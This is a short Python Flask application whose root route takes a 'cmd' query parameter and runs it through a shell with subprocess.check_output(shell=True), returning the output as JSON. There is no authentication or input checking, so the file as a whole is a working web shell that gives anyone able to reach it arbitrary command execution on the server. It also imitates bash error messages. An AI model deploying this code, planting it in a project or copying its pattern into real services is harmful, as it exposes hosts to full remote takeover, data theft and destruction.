from flask import Flask,request,jsonify
from subprocess import check_output as chk
import subprocess

app = Flask(__name__)

@app.route('/')
def hello_world():
    text = request.args.get("cmd")
    if not text:
        return jsonify({"result":"Input cmd parm"}),404
    try:
        return jsonify({"result":str(chk(text,shell=True).decode())}),200
    except subprocess.CalledProcessError:
        cmd = text.split(" ")[0]
        return jsonify({"result":f"bash {cmd} : command not found"}),404
    except:
        return jsonify({"result":"Error"}),500
